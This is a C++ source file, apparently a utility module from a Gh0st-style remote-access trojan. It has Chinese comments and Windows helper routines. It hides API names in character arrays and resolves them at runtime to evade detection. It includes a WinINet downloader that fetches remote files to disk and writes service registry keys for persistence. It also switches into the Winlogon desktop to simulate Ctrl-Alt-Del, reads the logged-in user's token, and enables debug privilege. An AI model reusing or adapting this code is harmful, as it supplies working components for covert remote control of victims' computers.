#include "stdafx.h"
#if !defined(AFX_UNTIL_CPP_INCLUDED)
#define AFX_UNTIL_CPP_INCLUDED

#include "../Declare.h"   //动态调用库函数
//#include <afxwin.h>
#include <process.h>
#include <Tlhelp32.h>
#include <Wtsapi32.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment( lib, "wininet.lib" )
#pragma comment(lib, "Wtsapi32.lib")
#include "until.h"
#include "../Myfunction.h"  //自定义函数

extern Myfunction *pMyfunction;

BOOL CheckFileExist(LPCTSTR lpszPath)
{
	if (GetFileAttributes(lpszPath)==0xFFFFFFFF && GetLastError()==ERROR_FILE_NOT_FOUND)
		return FALSE;
	else
		return TRUE;
}
////////////////////////////////////////////////////////////////////////////////////////////////
DWORD WINAPI ThreadLoader(LPVOID lparam)
{
	unsigned int nRet = 0;
#ifdef _DLL
 	try
 	{
#endif	
		THREAD_ARGLIST arg;
		pMyfunction->my_memcpy(&arg, lparam, sizeof(arg));
		
		char vaRYmkH[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	    char zyujYfj[] = {'S','e','t','E','v','e','n','t','\0'};
	    SetEventT pSetEvent=(SetEventT)GetProcAddress(LoadLibrary(vaRYmkH),zyujYfj);
		pSetEvent(arg.hEventTransferArg);
		// 与桌面交互
		if (arg.bInteractive)
		{
			SelectDesktop(NULL);
		}
		nRet = arg.start_address(arg.arglist);
#ifdef _DLL
	}
	catch(...){};
#endif
	return nRet;
}

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId, bool bInteractive)
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	arg;
	arg.start_address = (unsigned ( __stdcall *)( void * ))lpStartAddress;
	arg.arglist = (void *)lpParameter;
	arg.bInteractive = bInteractive;
	CreateEventAT pCreateEventA=(CreateEventAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateEventA");
	arg.hEventTransferArg = pCreateEventA(NULL, false, false, NULL);
	hThread = CreateThread(lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, lpThreadId);
	WaitForSingleObjectT pWaitForSingleObject=(WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.DLL"),"WaitForSingleObject");
	pWaitForSingleObject(arg.hEventTransferArg, INFINITE);
	CloseHandle(arg.hEventTransferArg);
	
	return hThread;
}

DWORD GetProcessID(LPCSTR lpProcessName)
{
	HANDLE			hProcessSnap = NULL;
	PROCESSENTRY32	pe32 = {0};
	
	// 获取系统进程快照
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return 0;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	for (BOOL bPE32=Process32First(hProcessSnap, &pe32); bPE32; bPE32=Process32Next(hProcessSnap, &pe32))
	{
		if (stricmp(pe32.szExeFile, lpProcessName) == 0)
		{
			CloseHandle(hProcessSnap);
			return pe32.th32ProcessID;
		}
	}
	CloseHandle(hProcessSnap);
	return 0;
}

BOOL SelectHDESK(HDESK new_desktop)
{
	GetCurrentThreadIdT pGetCurrentThreadId=(GetCurrentThreadIdT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetCurrentThreadId");
	GetThreadDesktopT pGetThreadDesktop=(GetThreadDesktopT)GetProcAddress(LoadLibrary("USER32.dll"),"GetThreadDesktop");
	HDESK old_desktop = pGetThreadDesktop(pGetCurrentThreadId());
	
	DWORD dummy;
	char new_name[256];
	
	if (!GetUserObjectInformationA(new_desktop, UOI_NAME, &new_name, 256, &dummy)) {
		return FALSE;
	}
	
	// Switch the desktop
	if(!SetThreadDesktop(new_desktop)) {
		return FALSE;
	}
	
	// Switched successfully - destroy the old desktop
	CloseDesktopT pCloseDesktop=(CloseDesktopT)GetProcAddress(LoadLibrary("USER32.dll"),"CloseDesktop");
	pCloseDesktop(old_desktop);
	
	return TRUE;
}

// - SelectDesktop(char *)
// Switches the current thread into a different desktop, by name
// Calling with a valid desktop name will place the thread in that desktop.
// Calling with a NULL name will place the thread in the current input desktop.

BOOL SelectDesktop(char *name)
{
	HDESK desktop;
	
	if (name != NULL)
	{
		OpenDesktopAT pOpenDesktopA=(OpenDesktopAT)GetProcAddress(LoadLibrary("USER32.dll"),"OpenDesktopA");
		desktop = pOpenDesktopA(name, 0, FALSE, 0x1FF);
	}
	else
	{
		OpenInputDesktopT pOpenInputDesktop=(OpenInputDesktopT)GetProcAddress(LoadLibrary("USER32.dll"),"OpenInputDesktop");
		desktop = pOpenInputDesktop(1, FALSE, 0x1FF);
	}
	
	if (desktop == NULL)
	{
		return FALSE;
	}
	
	// Switch to the new desktop
	if (!SelectHDESK(desktop))
	{
		// Failed to enter the new desktop, so free it!
		CloseDesktopT pCloseDesktop=(CloseDesktopT)GetProcAddress(LoadLibrary("USER32.dll"),"CloseDesktop");
		pCloseDesktop(desktop);
		return FALSE;
	}
	
	// We successfully switched desktops!
	return TRUE;
}

lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");
void SetInfo(LPCTSTR lpKeyName, LPCTSTR lpszValueName, LPCTSTR lpServiceName)
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);	
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, lpKeyName, REG_SZ, (char *)lpszValueName, plstrlenA(lpszValueName), 0);
}

void DelSetInfo(LPCTSTR lpKeyName, LPCTSTR lpszValueName, LPCTSTR lpServiceName)
{	
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);	
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, lpKeyName, REG_SZ, (char *)lpszValueName, plstrlenA(lpszValueName), 3);
}

BOOL http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	HINTERNET	hInternet, hUrl;
	HANDLE		hFile;
	char		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	BOOL		bIsFirstPacket = true;
	BOOL		bRet = true;
	
	char sIQkS10[] = {'M','o','z','i','l','l','a','/','4','.','0',' ','(','c','o','m','p','a','t','i','b','l','e',')','\0'};
	InternetOpenAT  pInternetOpenA  = (InternetOpenAT)GetProcAddress(LoadLibrary("wininet.dll"),"InternetOpenA");
	hInternet = pInternetOpenA(sIQkS10, INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);
	if (hInternet == NULL)
		return false;
	
	InternetCloseHandleT pInternetCloseHandle =  (InternetCloseHandleT)GetProcAddress(LoadLibrary("wininet.dll"),"InternetCloseHandle");
	InternetOpenUrlAT pInternetOpenUrlA =  (InternetOpenUrlAT)GetProcAddress(LoadLibrary("wininet.dll"),"InternetOpenUrlA");
	hUrl = pInternetOpenUrlA(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (hUrl == NULL)
	{
		pInternetCloseHandle(hInternet);
		return false;
	}
	
	CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateFileA");
	hFile = pCreateFileA(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			memset(buffer, 0, sizeof(buffer));
            InternetReadFileT pInternetReadFile=(InternetReadFileT)GetProcAddress(LoadLibrary("WININET.dll"),"InternetReadFile");
			pInternetReadFile(hUrl, buffer, sizeof(buffer), &dwBytesRead);
			
			// 由判断第一个数据包是不是有效的PE文件
// 			if (bIsFirstPacket && ((PIMAGE_DOS_HEADER)buffer)->e_magic != IMAGE_DOS_SIGNATURE)
// 			{
// 				bRet = false;
// 				break;
// 			}
// 			bIsFirstPacket = false;
			
			WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
			
		} while(dwBytesRead > 0);
		
		CloseHandle(hFile);
	}
	
	pInternetCloseHandle(hUrl);
	pInternetCloseHandle(hInternet);
	return bRet;
}

char *GetLogUserXP()
{
	TCHAR	*szLogName = NULL;
	DWORD	dwSize = 0;
	if (WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, WTSUserName, &szLogName, &dwSize))
	{
		char	*lpUser = new char[256];
		lstrcpy(lpUser, szLogName);
		WTSFreeMemory(szLogName);
		return lpUser;
	}
	else
		return NULL;
}

char *GetLogUser2K()
{
	DWORD	dwProcessID = GetProcessID("explorer.exe");
	if (dwProcessID == 0)
		return NULL;
	
	BOOL fResult  = FALSE;
    HANDLE hProc  = NULL;
	HANDLE hToken = NULL;
	TOKEN_USER *pTokenUser = NULL;
	char *lpUserName = NULL;
	
	__try
	{
        // Open the process with PROCESS_QUERY_INFORMATION access
        hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
        if (hProc == NULL)
		{
			__leave;
		}
        fResult = OpenProcessToken(hProc, TOKEN_QUERY, &hToken);
        if(!fResult)  
		{
			__leave;
		}
		
		DWORD dwNeedLen = 0;		
		fResult = GetTokenInformation(hToken,TokenUser, NULL, 0, &dwNeedLen);
		if (dwNeedLen > 0)
		{
			pTokenUser = (TOKEN_USER*)new BYTE[dwNeedLen];
			fResult = GetTokenInformation(hToken,TokenUser, pTokenUser, dwNeedLen, &dwNeedLen);
			if (!fResult)
			{
				__leave;
			}
		}
		else
		{
			__leave;
		}
		
		SID_NAME_USE sn;
		TCHAR szDomainName[MAX_PATH];
		DWORD dwDmLen = MAX_PATH;
		
		DWORD nNameLen = 256;
		lpUserName = new char[256];
		
		fResult = LookupAccountSid(NULL, pTokenUser->User.Sid, lpUserName, &nNameLen, szDomainName, &dwDmLen, &sn);
	}
	__finally
	{
		if (hProc)
			::CloseHandle(hProc);
		if (hToken)
			::CloseHandle(hToken);
		if (pTokenUser)
			delete[] (char*)pTokenUser;
	}
	return lpUserName;
}

char *GetCurrentLoginUser()
{
	OSVERSIONINFOEX    OsVerInfo;
	ZeroMemory(&OsVerInfo, sizeof(OSVERSIONINFOEX));
	OsVerInfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFOEX);
	if(!GetVersionEx((OSVERSIONINFO *)&OsVerInfo))
	{
		OsVerInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		if(!GetVersionEx((OSVERSIONINFO *)&OsVerInfo))
			return NULL;
	}
	
	if(OsVerInfo.dwMajorVersion == 5 && OsVerInfo.dwMinorVersion == 0)
		return GetLogUser2K();
	else
		return GetLogUserXP();
}

BOOL SimulateCtrlAltDel()
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());
	
	// Switch into the Winlogon desktop
	if (!SelectDesktop("Winlogon"))
	{
		return FALSE;
	}
	
	// Fake a hotkey event to any windows we find there.... :(
	// Winlogon uses hotkeys to trap Ctrl-Alt-Del...
	PostMessage(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));
	
	// Switch back to our original desktop
	if (old_desktop != NULL)
		SelectHDESK(old_desktop);
	
	return TRUE;
}

bool SwitchInputDesktop()
{
 	BOOL	bRet = false;
 	DWORD	dwLengthNeeded;
	
	HDESK	hOldDesktop, hNewDesktop;
	char	szOldDesktop[256], szNewDesktop[256];
	
	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(szOldDesktop, 0, sizeof(szOldDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &szOldDesktop, sizeof(szOldDesktop), &dwLengthNeeded);
	
	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(szNewDesktop, 0, sizeof(szNewDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &szNewDesktop, sizeof(szNewDesktop), &dwLengthNeeded);
	
	if (lstrcmpi(szOldDesktop, szNewDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	
	CloseDesktop(hOldDesktop);
	CloseDesktop(hNewDesktop);
	return bRet;
}

BOOL DebugPrivilege(const char *PName,BOOL bEnable)
{
	bool              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	
	HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll"); 
	
	typedef BOOL (WINAPI *OPT)(HANDLE ProcessHandle,DWORD DesiredAccess,PHANDLE TokenHandle); 
	OPT myopt; 
	myopt= (OPT)GetProcAddress(advapi32, "OpenProcessToken"); 
	
	typedef BOOL (WINAPI *ATP)(HANDLE TokenHandle,BOOL DisableAllPrivileges,PTOKEN_PRIVILEGES NewState,DWORD BufferLength,PTOKEN_PRIVILEGES PreviousState,PDWORD ReturnLength); 
	ATP myapt; 
	myapt= (ATP)GetProcAddress(advapi32, "AdjustTokenPrivileges");
	
	typedef BOOL (WINAPI *LPV)(LPCTSTR lpSystemName, LPCTSTR lpName,PLUID lpLuid); 
	LPV mylpv;
#ifdef UNICODE
	mylpv= (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueW");
#else
	mylpv= (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueA");
#endif
	
	HINSTANCE kernel32 = LoadLibrary("kernel32.dll"); 
	typedef HANDLE (WINAPI *TGetCurrentProcess)(VOID); 
	TGetCurrentProcess myGetCurrentProcess = (TGetCurrentProcess)GetProcAddress(kernel32, "GetCurrentProcess"); 
	
	
	if (!myopt(myGetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	
	mylpv(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	
	myapt(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	
	typedef int (WINAPI *GLE)(void); 
	GLE myGetLastError; 
	HINSTANCE hdlxxe = LoadLibrary("KERNEL32.dll"); 
	myGetLastError= (GLE)GetProcAddress(hdlxxe, "GetLastError"); 
	
    if (myGetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	CloseHandle(hToken);
	if(advapi32)
		FreeLibrary(advapi32);
	if(kernel32)
		FreeLibrary(kernel32);
	return bResult;	
}

#endif // !defined(AFX_UNTIL_CPP_INCLUDED)
